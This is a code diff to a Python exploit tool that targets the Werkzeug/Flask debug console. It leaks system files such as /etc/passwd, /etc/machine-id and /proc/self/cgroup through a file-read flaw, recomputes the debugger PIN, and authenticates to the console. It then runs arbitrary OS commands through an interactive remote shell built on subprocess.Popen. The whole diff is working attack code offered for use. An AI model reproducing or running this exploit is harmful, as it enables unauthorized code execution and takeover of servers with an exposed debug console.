@@ -5,6 +5,9 @@ import hashlib
 from itertools import chain
 from bs4 import BeautifulSoup as bs
 
+from prompt_toolkit import PromptSession
+from prompt_toolkit.shortcuts import clear
+
 def error(message="", prefix=""):
     print(f"{prefix}[ERROR] {message}")
     exit(1)
@@ -59,7 +62,9 @@ class WConsoleExtractor:
             info("Unable to find username")
             self.username = self.choose_username(etc_passwd)
 
-        self.python_version = self.get_python_version(server)
+        self.python_version = self.get_version(r"Python", server)
+        self.werkzeug_version = self.get_version(r"Werkzeug", server)
+
         self.flask_path = self.get_flask_path(WConsoleExtractor.get_venv(environ))
 
         if not self.flask_path:
@@ -81,7 +86,7 @@ class WConsoleExtractor:
             self.machine_id
         ]
 
-        self.pin_code = WConsoleExtractor.compute_pin(self.probably_public_bits, self.private_bits)
+        self.pin_code = self.compute_pin()
         self.token = self.get_token(content)
 
     @staticmethod
@@ -98,8 +103,40 @@ class WConsoleExtractor:
     @staticmethod
     def get_venv(environ:dict) -> bool:
         return environ.get("VIRTUAL_ENV")
-            
     
+    @staticmethod
+    def get_version(soft, server):
+        version = re.findall(soft + r"\/(\d\.\d+)\..*", server)
+        if len(version) == 0:
+            error(f"{soft} version not found")
+        return version[0].strip()
+    
+    @staticmethod
+    def compare_versions(v1:str, v2:str):
+        v1_split = v1.split(".")
+        v2_split = v2.split(".")
+
+        for i in range(3 - len(v1_split)):
+            v1_split.append("0")
+        
+        for i in range(3 - len(v2_split)):
+            v2_split.append("0")
+
+        for i in range(3):
+            diff = int(v1_split[i]) - int(v2_split[i])
+
+            if diff > 0:
+                return 1
+            if diff < 0:
+                return -1
+        
+        return 0
+
+    @staticmethod
+    def sanitize_output(output:str):
+        return output.replace("\\n", "\n")[2:-1]
+            
+
     def get(self, path:str):
         return self.sess.get(f"{self.base_url}{path}")
     
@@ -120,9 +157,6 @@ class WConsoleExtractor:
     def check_werkzeug(self):
         headers = self.get_headers()
         return headers.get("Server")
-    
-    def input(self):
-        return input()
     
     def print(self, message=""):
         print(message, end="")
@@ -157,12 +191,6 @@ class WConsoleExtractor:
                     return v[1:]
         
         return ""
-    
-    def get_python_version(self, server):
-        python_version = re.findall(r"Python\/(\d\.\d+)\..*", server)
-        if len(python_version) == 0:
-            error("Python version not found")
-        return python_version[0].strip()
 
     def get_flask_path(self, venv:str) -> str:
         base_version = self.python_version.rsplit(".", 1)[0]
@@ -177,7 +205,7 @@ class WConsoleExtractor:
                 f"/proc/self/cwd/env/lib/python{base_version}/dist-packages/flask/app.py",
             ]
         else:
-            home_dir = f"/home/{self.username}" if self.username != "root" else "/root/"
+            home_dir = f"/home/{self.username}" if self.username != "root" else "/root"
 
             potential_paths = [
                 # lib
@@ -226,10 +254,13 @@ class WConsoleExtractor:
         value = ""
         for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
             content = self.leak_function(filename)
-            matched = re.findall(r"[0-9a-f\-]+", content)
+            if content == "": continue
 
-            if len(matched) > 0:
-                value = matched[0]
+            v = content.splitlines()[0].strip()
+            
+            if v:
+                value += v
+                break
             
         try:
             content2 = self.leak_function("/proc/self/cgroup")
@@ -253,10 +284,15 @@ class WConsoleExtractor:
 
         return uuid_node
     
-    def compute_pin(probably_public_bits, private_bits):
-        # h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
-        h = hashlib.sha1()
-        for bit in chain(probably_public_bits, private_bits):
+    def compute_pin(self):
+        is_v2 = WConsoleExtractor.compare_versions(self.werkzeug_version, "2.0.0") >= 0
+        
+        if is_v2:
+            h = hashlib.sha1()
+        else:
+            h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+        
+        for bit in chain(self.probably_public_bits, self.private_bits):
             if not bit:
                 continue
             if isinstance(bit, str):
@@ -292,11 +328,15 @@ class WConsoleExtractor:
 
         return token[0]
 
-    def exec_cmd(self, cmd):
+    def exec_cmd(self, cmd:str):
+        argv = cmd.split(' ')
+
+        # Authentication
         authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
         self.get(authent_path)
-
-        url = f"/console?__debugger__=yes&cmd=__import__('os').popen('{cmd}').read()&frm=0&s={self.token}"
+        
+        payload = f"import subprocess; subprocess.Popen({argv}, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()"
+        url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
         res = self.get(url)
 
         if res.status_code == 404:
@@ -304,25 +344,41 @@ class WConsoleExtractor:
             return
         
         soup = bs(res.text, 'html.parser')
-        span = soup.find("span")
+        span = soup.find("span", attrs={"class":"string"})
+        traceback = soup.find("div", attrs={"class":"traceback"})
+
         if span:
-            output = span.contents[0].replace("'", "").replace("\\n", "\n")
+            res = span.contents[0]
+            extended = span.find("span")
+            if extended:
+                res += extended.contents[0]
+            output = WConsoleExtractor.sanitize_output(res)
+        elif traceback:
+            err = traceback.find("blockquote")
+            output = err.contents[0]
         else:
-            output = "This command returned no output"
+            output = ""
 
         return output.strip()
-    
+
     def shell(self):
         exit_commands = ["exit", "quit", "q"]
-        cmd = ""
+        clear_commands = ["clear", "c"]
+        session = PromptSession()
 
-        while cmd not in exit_commands:
+        while True:
             try:
-                self.print(f"[SHELL] > ")
-                cmd = self.input()
-            except KeyboardInterrupt:
+                cmd = session.prompt("[SHELL] > ")
+                if cmd in exit_commands:
+                    raise SystemExit
+                if cmd in clear_commands:
+                    clear()
+                    continue
+            except (KeyboardInterrupt, EOFError, SystemExit):
                 break
-
-            self.print(f"{self.exec_cmd(cmd)}\n")
-        
-        info("Shell terminated", prefix="\n")
+            else:
+                output = self.exec_cmd(cmd)
+                if output.startswith("FileNotFoundError"):
+                    output = f"{cmd}: command not found"
+                self.print(f"{output}\n")
+        info("Shell terminated")
